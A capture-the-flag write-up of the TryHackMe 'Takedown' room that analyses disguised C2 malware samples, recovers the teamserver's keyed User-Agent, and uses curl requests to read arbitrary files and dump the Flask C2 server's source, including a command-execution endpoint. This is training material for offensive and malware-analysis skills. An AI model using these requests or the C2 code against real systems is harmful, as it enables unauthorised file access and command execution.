# Takedown

## Introduction:

Welcome to my another writeup! In this TryHackMe [Takedown](https://tryhackme.com/room/takedown) room, you'll learn: malware analysis, Linux rootkit, and more! Without further ado, let's dive in.

## Background

> We have reason to believe a corporate webserver has been compromised by RISOTTO GROUP. Cyber interdiction is authorized for this operation. Find their teamserver and take it down.

> Difficulty: Insane

```
(AUTHOR'S NOTE: This THM room should be treated as a work of fiction. The author of this room does not condone unauthorized hacking of anything for any reason. Hacking back is a crime.)

IMPORTANT: Make sure to add the IP address as takedown.thm.local to your /etc/hosts file.

Good morning, operator! The Commanding Officer is very excited about this mission. The mission brief is ready for you.

Click "Download Task Files" to download the mission brief. Read it carefully!

When you are ready, proceed with the operation.
```

- Overall difficulty for me: Hard
	- Initial foothold: Very hard
	- Privilege escalation: Easy

### [Mission brief](https://tryhackme.com/material/deploy)

#### OPORD - OVERCOOKED RISOTTO

Operations Order - Operation: OVERCOOKED RISOTTO Commanding Officer: LtCol Shelly “AJAX” Jackson 501st Cyber Interdiction Battalion, JCOG (Joint Cyber Operations Group) \[ REDACTED LOCATION \], \[ REDACTED LOCATION \]

#### SITUATION

Cyber Criminal operations cell RISOTTO GROUP is suspected to be active in Area of Operations (AO). 501st operators are tasked with intercepting RISOTTO GROUP, regaining control of a target webserver, and removing opposing force from target infrastructure.

#### BACKGROUND

INFINITY was a digital design firm active in the mid 2010s before the company’s dissolution in 2022. The INFINITY website was hosted at http://takedown\[.\]thm\[.\]local and included a description of the company and some of the company’s digital portfolio. The website was decommissioned and retired on March 22nd, 2022.

Reconnaissance operations report that the INFINITY website is now back online. Intel reports indicate the website is now serviceable as recently as \~24 hours prior to the release of this OPORD. Intelligence reports with high confidence that this is the work of RISOTTO GROUP, an active cyber criminal ring in this AO.

#### MISSION

- Identify indicators of compromise of the INFINITY webserver
- Regain positive control of the INFINITY webserver
- Prosecute and deny RISOTTO GROUP operators
- Produce proof of positive control of the target webserver (user.txt and root.txt)

#### RULES OF ENGAGEMENT

- All methods of cyber interdiction are authorized for this operation.
- Denial of Service is not authorized against the target webserver or any RISOTTO GROUP infrastructure in order to preserve post-operation intelligence gathering capabilities.

#### INTELLIGENCE BRIEF

RISOTTO GROUP’s capabilities include custom command & control (C2) infrastructure and custom malware development. RISOTTO GROUP’s primary development languages include Go, Nim, Rust, C, and C++. RISOTTO GROUP has also been observed deploying additional capabilities when required, including Living off the Land Binaries and Scripts (LOLBAS) and native languages like PowerShell. The latest C2 samples indicate RISOTTO GROUP is using a newer C2 framework known as NIMBLEWISP.

RISOTTO GROUP does not often encrypt their C2 communication channels and forsake stealth for speed. RISOTTO GROUP is known to deploy malware keying tactics to ensure target accountability during operations. Keying values include username, hostname, domain name, and/or domain joined status. RISOTTO GROUP’s motivations are primarily financial.

RISOTTO GROUP operators are not particularly skilled but follow pre-defined playbooks (AGGRESSOR) when conducting operations. AGGRESSOR TTPs include basic enumeration and exfiltration of files to the NIMBLEWISP teamserver

#### RISOTTO GROUP SAMPLE INDICATORS OF COMPROMISE / MALWARE (IOCs)

The following malware samples are attributed to RISOTTO GROUP.

MALWARE COVER NAME 	 | SAMPLE NAME / FILE TYPE | TTP                   | SHA256 HASH
---------------------|-------------------------|-----------------------|--------------
HAYDAY 			         | cannonball.exe		   	   | Data Exfiltration     | bd98f01b81fa4b671568d31fdc047fab76a2b7ce91352a029f27ce7f15ad401b
SHINESPARK 			     | pspsps.ps1 			       | Initial Access        | 450a60c214b7bbe186938d20830aa6402cf013af17d6751f6fe7b106deb4021e
SYNTHWAVE 			     | whoHas.vbs			         | Encryption for Impact | d8a928b2043db77e340b523547bf16cb4aa483f0645fe0a290ed1f20aab76257
CHEAPCOLOGNE 			   | mstupdater.exe		       | Persistence           | ee13f4a800cffe4ff2eaafd56da207b0e583fac54d663ca561870e1bc4eeaad6
MAGICSTACK 			     | urllib32.dll			       | Lateral Movement 	   | ce0b1888dde30a95e35f9bcf0d914b63764107f15fb57c5606e29b06f08874a1
GUNRUNNER 			     | favicon.ico			       | Initial Access        | 80e19a10aca1fd48388735a8e2cfc8021724312e1899a1ed8829db9003c2b2dc
CHIVALROUSTOAD 			 | srv.vbs				         | Persistence           | 707dd13b5b61ecb73179fe6a5455095f0976d364e129e95c8ad0a01983876ecb
GRIDLOCK 			       | regsrv86.dll 		       | Persistence           | dbf8f09abe7ff34f4f54f3af8a539f3dba063396d51764554105ce100c443dd2
OPTOMETRIC 			     | shutterbug.jpg		       | Initial Access        | 265d515fbe1e8e19da9adeabebb4e197e2739dad60d38511d5d23de4fbcf3970
VIGOROUSWEASLE 			 | shutdown.dll			       | Persistence           | 4d4584683472d8ec1ccf0d46e62a9fc54998fda96e12fa8d6e615ee0b7f36096

#### COMMAND AND SIGNAL

The Commanding Officer of this operation is LtCol Shelly “AJAX” Jackson. This OPORD is active upon receipt.

```
VM IP: 10.10.51.56

REMINDER: Make sure to add the IP address as takedown.thm.local to your /etc/hosts file.

Note: This VM may take about 5-8 minutes to fully initialize. A basic Nmap scan (nmap -sC -sV takedown.thm.local) should indicate two open ports.
```

# Service Enumeration

**Adding `takedown.thm.local` domain to `/etc/hosts`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# export RHOSTS=10.10.51.56
                                                                                                       
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# echo "$RHOSTS takedown.thm.local" | tee -a /etc/hosts
```

**Nmap:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# nmap -sT -T4 -sC -sV takedown.thm.local
[...]
PORT   STATE    SERVICE VERSION
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1d:55:62:3c:60:2e:b6:1c:5f:b4:ae:fa:0a:a4:a9:4f (RSA)
|   256 f1:b5:9a:77:c6:aa:39:0c:b0:b5:eb:53:99:4b:87:dc (ECDSA)
|_  256 0d:fb:e4:9c:01:49:5d:46:c3:5d:4e:99:26:e4:45:96 (ED25519)
80/tcp filtered http
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `nmap` result, we have 2 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 8.2p1 Ubuntu
80                | HTTP

## HTTP on Port 80

**In `robots.txt`, we can see there is a `/favicon.ico` file, which is the `GUNRUNNER` malware:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# curl -s http://takedown.thm.local/robots.txt  
User-agent: *
Disallow: /favicon.ico
```

**We can download that malware for reverse engineering via `wget`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# wget http://takedown.thm.local/favicon.ico
[...]

┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# file favicon.ico 
favicon.ico: PE32+ executable (GUI) x86-64, for MS Windows

┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# sha256sum favicon.ico 
80e19a10aca1fd48388735a8e2cfc8021724312e1899a1ed8829db9003c2b2dc  favicon.ico
```

**According to `file` command's output, it's an PE32+ executable, not an icon image file.**

Now, we can **use `strings` to list all the strings** inside that executable:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# strings favicon.ico
[...]
@/download
@data
@Could not read file: 
@[x] Download args: download [agent source] [server destination]
[*] For example: download C:\Windows\Temp\foo.exe /home/kali/foo.exe
@http://takedown.thm.local/
@File written!
@[+] Downloaded 
@/upload
@/api/agents/
@file
@ from C2 server
@[*] Ready to receive 
@[x] Upload args: upload [server source] [agent destination]
[*] For example: upload foo.exe C:\Windows\Temp\foo.exe
[...]
```

We can see that **it's a C2 (Command and Control) malware.**

Let's continue our enumeration process:

**Gobuster:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# gobuster dir -u http://takedown.thm.local/ -w /usr/share/wordlists/dirb/common.txt -t 100
[...]
/css                  (Status: 301) [Size: 322] [--> http://takedown.thm.local/css/]
/fonts                (Status: 301) [Size: 324] [--> http://takedown.thm.local/fonts/]
/images               (Status: 301) [Size: 325] [--> http://takedown.thm.local/images/]
/inc                  (Status: 301) [Size: 322] [--> http://takedown.thm.local/inc/]   
/index.html           (Status: 200) [Size: 25844]                                      
/favicon.ico          (Status: 200) [Size: 605010]                                     
/js                   (Status: 301) [Size: 321] [--> http://takedown.thm.local/js/]    
/robots.txt           (Status: 200) [Size: 36]                                         
/server-status        (Status: 403) [Size: 283]
```

**`/inc/`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# curl -s http://takedown.thm.local/inc/ | html2text
****** Index of /inc ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                   - 
[[   ]]       sendEmail.php    2022-07-28 18:20   79 
===========================================================================
```

**Found `/inc/sendEmail.php`:**
```php
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# curl -s http://takedown.thm.local/inc/sendEmail.php
<?php

if($_POST) {

		echo "Under construction, check back later";

	} 

?>
```

Nothing useful.

**`/images/`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# curl -s http://takedown.thm.local/images/ | html2text
****** Index of /images ******
[[ICO]]       Name               Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                     - 
[[IMG]]       arrow.png          2022-07-28 18:20  488 
[[DIR]]       avatars/           2022-07-28 18:20    - 
[[DIR]]       clients/           2022-07-28 18:20    - 
[[IMG]]       contact-bg.jpg     2022-07-28 18:20 967K 
[[IMG]]       hero-bg.jpg        2022-07-28 18:20 370K 
[[DIR]]       lightgallery/      2022-07-28 18:20    - 
[[IMG]]       logo.png           2022-07-28 18:20 2.5K 
[[DIR]]       portfolio/         2022-07-28 18:20    - 
[[IMG]]       sample-image.jpg   2022-07-28 18:20  22K 
[[IMG]]       services-bg.jpg    2022-07-28 18:20 216K 
[[IMG]]       shutterbug.jpg     2022-07-28 18:20 131K 
[[   ]]       shutterbug.jpg.bak 2022-07-28 18:27 325K 
===========================================================================
```

**The `shutterbug.jpg.bak` looks like is the `OPTOMETRIC` malware.**

**Let's `wget` that:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# wget http://takedown.thm.local/images/shutterbug.jpg.bak
```

```                                                                                                        
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# file shutterbug.jpg.bak 
shutterbug.jpg.bak: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9e3c7f037a52f26b1982f131013708f59786d773, for GNU/Linux 3.2.0, not stripped

┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# sha256sum shutterbug.jpg.bak 
265d515fbe1e8e19da9adeabebb4e197e2739dad60d38511d5d23de4fbcf3970  shutterbug.jpg.bak
```

**Let's `strings` that again:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# strings shutterbug.jpg.bak
[...]
@[*] Sleeping: 10000
@results
@[*] Result: 
@Error
@data
@[x] Download args: download [agent source] [server destination]
[*] For example: download C:\Windows\Temp\foo.exe /home/kali/foo.exe
@http://takedown.thm.local/
@File written!
@file
@[x] Upload args: upload [server source] [agent destination]
[*] For example: upload foo.exe C:\Windows\Temp\foo.exe
@exec 
@get_hostname
@pwd
@upload
@[*] Command to run: 
@[*] Checking for command...
@[*] Hostname: 
@[*] My UID is: 
@http://takedown.thm.local/api/agents/register
@Authorization
@Host
@httpclient.nim(1144, 15) `false` 
@Transfer-Encoding
@Content-Length
@httpclient.nim(1082, 13) `not url.contains({'\r', '\n'})` url shouldn't contain any newline characters
@uid
@application/json
@Content-Type
@Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
@random.nim(325, 10) `x.a <= x.b` 
@hostname
@[*] Key matches!
@c.oberst
@whoami
@[*] Checking keyed username...
@[*] Drone ready!
@{prog}
Usage:
   [options] 
Options:
  -h, --help
  -v, --ver
[...]
```

In the above `strings` output, we can see there is an API endpoint: `http://takedown.thm.local/api/agents/register`.

**But I can't reach there:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# curl -vv http://takedown.thm.local/api/
[...]
< Server: nginx/1.23.1
[...]
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at takedown.thm.local Port 80</address>
</body></html>
* Connection #0 to host takedown.thm.local left intact
```

And... I found something weird...

```
< Server: nginx/1.23.1
[...]
Apache/2.4.52 (Ubuntu) Server at takedown.thm.local Port 80
```

Why `nginx` and `apache`??

After some googling, I found that this is a **Nginx reverse proxy**.

I tried some bypasses, but no dice...

And then I dig deeper in the `favicon.ico` PE file, I found something weird to me:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# strings favicon.ico 
[...]
@[*] Command to run: 
@/command
@http://takedown.thm.local/api/agents/
@[*] Checking for command...
@[*] Hostname: 
@[*] My UID is: 
@http://takedown.thm.local/api/agents/register
@Authorization
@Host
@httpclient.nim(1144, 15) `false` 
@Transfer-Encoding
@Content-Length
@httpclient.nim(1082, 13) `not url.contains({'\r', '\n'})` url shouldn't contain any newline characters
@uid
@application/json
@Content-Type
@Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
@random.nim(325, 10) `x.a <= x.b` 
@hostname
@[*] Key matches!
```

Hmm... **What if the C2 endpoint is checking the `User-Agent` to communicate  between the C2 teamserver??**

**Let's provide that `User-Agent` in `curl`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# curl -vv -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local/api/agents
*   Trying 10.10.51.56:80...
* Connected to takedown.thm.local (10.10.51.56) port 80 (#0)
> GET /api/agents HTTP/1.1
> Host: takedown.thm.local
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.23.1
< Date: Sun, 02 Oct 2022 04:31:45 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 39
< Connection: keep-alive
< Keep-Alive: timeout=20
< Access-Control-Allow-Origin: *
< 
* Connection #0 to host takedown.thm.local left intact
{'okpj-pigz-ypeu-fwaf': 'www-infinity'}
```

Ohh!!! We're no longer in Apache!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# curl -vv -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local/api/agents/register
*   Trying 10.10.51.56:80...
* Connected to takedown.thm.local (10.10.51.56) port 80 (#0)
> GET /api/agents/register HTTP/1.1
> Host: takedown.thm.local
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 401 UNAUTHORIZED
< Server: nginx/1.23.1
< Date: Sun, 02 Oct 2022 04:34:37 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 23
< Connection: keep-alive
< Keep-Alive: timeout=20
< Access-Control-Allow-Origin: *
< 
* Connection #0 to host takedown.thm.local left intact
You're not a live agent
```

In `/api/agents/register`, it returns a 401 status, and says `You're not a live agent`.

Maybe it's checking if the user has a cookie or not...

**And think back, the `/api/agents` looks like a cookie:**
```json
{'okpj-pigz-ypeu-fwaf': 'www-infinity'}
```

**Let's supply that cookie to `curl`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# curl -vv -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" --cookie "okpj-pigz-ypeu-fwaf=www-infinity" http://takedown.thm.local/api/agents/register
*   Trying 10.10.51.56:80...
* Connected to takedown.thm.local (10.10.51.56) port 80 (#0)
> GET /api/agents/register HTTP/1.1
> Host: takedown.thm.local
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
> Accept: */*
> Cookie: okpj-pigz-ypeu-fwaf=www-infinity
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 401 UNAUTHORIZED
< Server: nginx/1.23.1
< Date: Sun, 02 Oct 2022 04:43:58 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 23
< Connection: keep-alive
< Keep-Alive: timeout=20
< Access-Control-Allow-Origin: *
< 
* Connection #0 to host takedown.thm.local left intact
You're not a live agent
```

Hmm... **Maybe the `okpj-pigz-ypeu-fwaf` is the agent name??**

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local/api/agents/okpj-pigz-ypeu-fwaf    
Agent info:
UID: okpj-pigz-ypeu-fwaf - Hostname: www-infinity
```

Nice!!

**In the output of `strings` in `favicon.ico` PE file, I also found a `/command` page:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local/api/agents/okpj-pigz-ypeu-fwaf/command
hostname           

┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local/api/agents/okpj-pigz-ypeu-fwaf/command
pwd           

┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local/api/agents/okpj-pigz-ypeu-fwaf/command
upload bar.txt foo.txt  

┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local/api/agents/okpj-pigz-ypeu-fwaf/command
id 
```

**Also, after some enumeration in `strings` `favicon.ico`  PE file, I also found that there is a `/upload` page.**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# strings favicon.ico 
[...]
/upload
[...]
filename
[...]
@application/json
@Content-Type
```

**Let's try that in `curl`!**

> Note: Since there is a string called `filename`, I assume that this `/upload` page allows me to read or download any files.

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" -H "Content-Type: application/json" -X POST -d '{"filename":"/etc/passwd"}' http://takedown.thm.local/api/agents/okpj-pigz-ypeu-fwaf/upload
<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

Status 500? Maybe the POST parameter name is wrong? Let me try **`file` parameter**:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" -H "Content-Type: application/json" -X POST -d '{"file":"/etc/passwd"}' http://takedown.thm.local/api/agents/okpj-pigz-ypeu-fwaf/upload 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

OHH!!! I have **arbitrary file read**!

When I try to read a non-exist file, it shows me a status 500 error message.

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" -H "Content-Type: application/json" -X POST -d '{"file":"nothing"}' http://takedown.thm.local/api/agents/otyu-ekzt-jnhz-pqgg/upload
<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

Then, I googled about this message, and I found a [StackOverflow post](https://stackoverflow.com/questions/10219486/flask-post-request-is-causing-server-to-crash) that saying this is a **Flask backend web application**.

Also, **I suspect that this Flask app is running on a docker container, so I took a look at the `Dockerfile`**, which contains all the commands a user could call on the command line to assemble an image.

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" -H "Content-Type: application/json" -X POST -d '{"file":"Dockerfile"}' http://takedown.thm.local/api/agents/otyu-ekzt-jnhz-pqgg/upload
FROM python:3.8-slim-buster

WORKDIR /python-docker

COPY requirements.txt requirements.txt
RUN pip3 install -r requirements.txt

COPY . .

CMD [ "python3", "app.py"]
```

Hmm... **That `app.py` looks like a Flask file! Let's read that file!**

```py
┌──(root🌸siunam)-[~/ctf/thm/ctf/Takedown]
└─# curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" -H "Content-Type: application/json" -X POST -d '{"file":"app.py"}' http://takedown.thm.local/api/agents/okpj-pigz-ypeu-fwaf/upload
import logging
import sys
import json
from threading import Thread
import re
import random
from os import system

import flask
from flask import request, abort
from flask_cors import CORS

HEADER_KEY = "z.5.x.2.l.8.y.5"

command_list = []
command_to_execute_next = ""
command_stack_reset_flag = False
agg_commands = open('aggressor.txt', 'r')
lines = agg_commands.readlines()
for line in lines:
    command_list.append(line.strip())

available_commands = ['id', 'whoami', 'upload [Usage: upload server_source agent_dest]', 'download [usage download agent_source server_dest]', 'exec [Usage: exec command_to_run]', 'pwd', "get_hostname"]

live_agents = {}

app = flask.Flask(__name__)
app.secret_key = "000011112222333344445555666677778888"

logging.basicConfig(filename='teamserver.log', level=logging.DEBUG)


def is_user_agent_keyed(user_agent):
    return HEADER_KEY in user_agent


def json_response(app, data):
    try:
        return app.response_class(
            response=json.dumps(data),
            status=200,
            mimetype='application/json'
        )
    except Exception as e:
        return str(e)


def is_command_reset_flag_set(command_stack_reset_flag):
    return command_stack_reset_flag


@app.route("/")
def hello_world():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        return "."
    else:
        abort(404)


@app.route('/api/server', methods=['GET'])
def get_server_info():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        server_info = {"guid": "9e29fc5d-31dc-4fc2-9318-d17b2694d8aa", "name": "C2-SHRIKE-1"}
        return json_response(app, server_info)
    else:
        abort(404)

@app.route('/api/agents', methods=['GET'])
def get_agent_info():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if live_agents:
            return str(live_agents), 200
        else:
            return "No live agents", 200
    else:
        abort(404)


@app.route(f'/api/agents/commands', methods=['GET'])
def get_agent_commands():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        return f"Available Commands: {available_commands}", 200
    else:
        abort(404)


@app.route('/api/agents/register', methods=['POST'])
def post_register_agent():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if request.json:
            try:
                uid = request.json["uid"]
                hostname = request.json["hostname"]
                live_agents[uid] = hostname
                msg = f"New agent UID: {uid} on host {hostname}"
                app.logger.debug(msg)
                print(msg)
                return msg, 200
            except Exception as e:
                return str(e), 500
        return "MESSAGE: {0}".format(request.is_json)
    else:
        abort(404)


@app.route('/api/agents/<uid>', methods=['GET'])
def get_agent(uid):
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if uid in live_agents:
            info = live_agents.get(uid)
            return f"Agent info:\nUID: {uid} - Hostname: {info}", 200
        else:
            return "You're not a live agent", 401
    else:
        abort(404)


@app.route('/api/agents/<uid>/command', methods=['GET', 'POST'])
def get_agent_command(uid):
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if uid in live_agents:
            if request.method == 'GET':
                global command_to_execute_next
                global command_stack_reset_flag
                if command_to_execute_next:
                    command_reset_flag = is_command_reset_flag_set(command_stack_reset_flag)
                    if command_reset_flag:
                        command = random.choice(command_list)
                        return f"{command}", 200
                    else:
                        command = command_to_execute_next
                        command_stack_reset_flag = True
                        return f"{command}", 200
                else:
                    command = random.choice(command_list)
                    return f"{command}", 200
            if request.json:
                result = request.json["results"]
                app.logger.debug(result)
                print(result)
                return "OK", 200
        else:
            return "You're not a live agent", 401
    else:
        abort(404)


@app.route(f'/api/agents/<uid>/upload', methods=['POST'])
def post_upload(uid):
    if is_user_agent_keyed(request.headers.get('User-Agent')):     
        if uid in live_agents:
            if request.json:
                file = request.json["file"]
                f = open(file,"rb")
                data = f.read()
                f.close()
                return data, 200
        else:
            return 401
    else:
        abort(404)


@app.route(f'/api/agents/<uid>/download', methods=['POST'])
def post_download(uid):
    if is_user_agent_keyed(request.headers.get('User-Agent')):     
        if uid in live_agents:
            if request.json:
                file = request.json["file"]
                if file in ["app.py", "aggressor.txt"]:
                    abort(404)
                data = request.json["data"]
                f = open(file ,"w")
                f.write(data)
                f.close()
                return "OK", 200
        else:
            return 401
    else:
        abort(404)


@app.route(f'/api/server/exec', methods=['POST'])
def post_server_exec():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if request.json:
            cmd = request.json['cmd']
            res = system(f"{cmd}")
            return f"Command: {cmd} - Result code: {res}", 200
        else:
            return "Bad request", 400
    else:
        abort(404)


@app.route('/api/agents/<uid>/exec', methods=['GET', 'POST'])
def post_agent_exec(uid):
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if uid in live_agents:
            if request.method == 'GET':
                return f"EXEC: {uid}", 200
            if request.method == 'POST':
                if request.json:
                    global command_to_execute_next
                    command_to_execute_next = request.json["cmd"]
                    global command_stack_reset_flag
                    command_stack_reset_flag = False
                    msg = f"New commnad to execute: {command_to_execute_next}"
                    app.logger.debug(msg)
                    print(msg)
                    return msg, 200
                else:
                    return "Bad request", 400
            else:
                abort(404)
        else:
            abort(404)
    else:
        abort(404)


@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        return flask.render_template("index.html")
    else:
        abort(404)


CORS(app, resources={r"/*": {"origins": "*"}})


if __name__=="__main__":
    app.run(host="0.0.0.0", port=8000)
```

Let's analyze this Flask script!

**`/api/agents/<uid>/download` route:**
```py
@app.route(f'/api/agents/<uid>/download', methods=['POST'])
def post_download(uid):
    if is_user_agent_keyed(request.headers.get('User-Agent')):     
        if uid in live_agents:
            if request.json:
                file = request.json["file"]
                if file in ["app.py", "aggressor.txt"]:
                    abort(404)
                data = request.json["data"]
                f = open(file ,"w")
                f.write(data)
                f.close()
                return "OK", 200
        else:
            return 401
    else:
        abort(404)
```

**In `download` route, I can write stuff into disk, with the POST json parameter `file` and `data`.**

**`/api/agents/<uid>/upload` route:**
```py
@app.route(f'/api/agents/<uid>/upload', methods=['POST'])
def post_upload(uid):
    if is_user_agent_keyed(request.headers.get('User-Agent')):     
        if uid in live_agents:
            if request.json:
                file = request.json["file"]
                f = open(file,"rb")
                data = f.read()
                f.close()
                return data, 200
        else:
            return 401
    else:
        abort(404)
```

**In `upload` route, I can read any files, with the POST json parameter `file`.** 

**`/api/agents/<uid>/exec` route:**
```py
@app.route('/api/agents/<uid>/exec', methods=['GET', 'POST'])
def post_agent_exec(uid):
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if uid in live_agents:
            if request.method == 'GET':
                return f"EXEC: {uid}", 200
            if request.method == 'POST':
                if request.json:
                    global command_to_execute_next
                    command_to_execute_next = request.json["cmd"]
                    global command_stack_reset_flag
                    command_stack_reset_flag = False
